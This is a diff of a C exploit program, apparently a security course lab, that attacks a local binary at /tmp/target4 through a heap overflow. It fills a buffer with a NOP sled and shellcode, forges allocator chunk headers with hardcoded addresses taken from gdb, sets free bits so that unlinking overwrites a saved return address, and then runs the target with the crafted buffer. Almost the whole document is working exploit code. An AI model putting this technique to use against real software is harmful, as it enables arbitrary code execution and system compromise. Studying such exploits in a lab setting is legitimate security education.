@@ -4,51 +4,21 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target4"
+#define TARGET   "/tmp/target4"
+#define NOOP     0x90
 
-/*
- * the chunk header
- */
-typedef double ALIGN;
 
-typedef union CHUNK_TAG
+//header for chunk
+typedef union Chunk_T
 {
   struct
     {
-      union CHUNK_TAG *l;       /* leftward chunk */
-      union CHUNK_TAG *r;       /* rightward chunk + free bit (see below) */
+      union Chunk_T *left_chunk;
+      union Chunk_T *right_chunk;
     } s;
-  ALIGN x;
-} CHUNK;
+  double x;
+} Chunk_Tag;
 
-/*
- * we store the freebit -- 1 if the chunk is free, 0 if it is busy --
- * in the low-order bit of the chunk's r pointer.
- */
-
-/* *& indirection because a cast isn't an lvalue and gcc 4 complains */
-#define SET_FREEBIT(chunk) ( *(unsigned *)&(chunk)->s.r |=  0x1 )
-#define CLR_FREEBIT(chunk) ( *(unsigned *)&(chunk)->s.r &= ~0x1 )
-#define GET_FREEBIT(chunk) ( (unsigned)(chunk)->s.r & 0x1 )
-
-/* it's only safe to operate on chunk->s.r if we know freebit
- * is unset; otherwise, we use ... */
-#define RIGHT(chunk) ((CHUNK *)(~0x1 & (unsigned)(chunk)->s.r))
-
-/*
- * chunk size is implicit from l-r
- */
-#define CHUNKSIZE(chunk) ((unsigned)RIGHT((chunk)) - (unsigned)(chunk))
-
-/*
- * back or forward chunk header
- */
-#define TOCHUNK(vp) (-1 + (CHUNK *)(vp))
-#define FROMCHUNK(chunk) ((void *)(1 + (chunk)))
-
-#define PPOINTER 0x8059878 
-#define QPOINTER 0x8059948 
-#define EIP      0xbffffa7c
 
 int main(void)
 {
@@ -56,33 +26,42 @@ int main(void)
   char *env[1];
   char buf[1024];
 
-  memset(buf, 0x90, 1024);
-  strncpy(buf+800, shellcode, 45);
-  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
 
-  void *vp = (void*)buf + (QPOINTER - PPOINTER);
-  CHUNK *p = TOCHUNK(vp);
+  //Steps
+  //1. add noop sled to so that eip falls into noop for safe landing
+  memset(buf, NOOP, 1024);
 
-  p->s.l = (void*)QPOINTER; 
-  p->s.r = (void*)EIP;
+  //2. add shellcode from alephone
+  strncpy(buf + 600, shellcode, 45);
 
-  CHUNK *l = TOCHUNK(vp+sizeof(CHUNK));
-  CHUNK *r = TOCHUNK(vp-sizeof(CHUNK));
+  //3. Craft the chunk header as per the explanation
+  void *new_ptr = (void*)buf + (0x8059948 - 0x8059878); //p pointer and q pointers addresses from gdb
+  Chunk_Tag *p = -1 + (Chunk_Tag *)(new_ptr);
 
-  // Do a jmp for 12 bytes as the phrack suggested
-  strncpy((char*)l+2, "\xeb\x0c", 2);
-  
-  SET_FREEBIT(l);
-  //SET_FREEBIT(r);
-  SET_FREEBIT(p);
+  p->s.left_chunk = (void*) 0x8059948;  //p pointers address from gdb 
+  p->s.right_chunk = (void*) 0xbffffa7d; //new landing point inside our buffer containing shellcode
+
+  Chunk_Tag *left_chunk = -1 + (Chunk_Tag *) (new_ptr + sizeof(Chunk_Tag));
+
+  Chunk_Tag *right_chunk = -1 + (Chunk_Tag *)(new_ptr - sizeof(Chunk_Tag));
+
+  //phrack's jump code
+  strncpy((char*)left_chunk + 1, "\xeb", 1);
+  strncpy((char*)left_chunk + 2, "\x0c", 1);
+
+  *(unsigned *)&(left_chunk)->s.right_chunk |=  0x1;
+
+  *(unsigned *)&(p)->s.right_chunk |=  0x1;
  
-  args[0] = TARGET; 
+  args[0] = TARGET;
   args[1] = buf;
   args[2] = NULL;
   env[0] = NULL;
+
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
   return 0;
+
 }
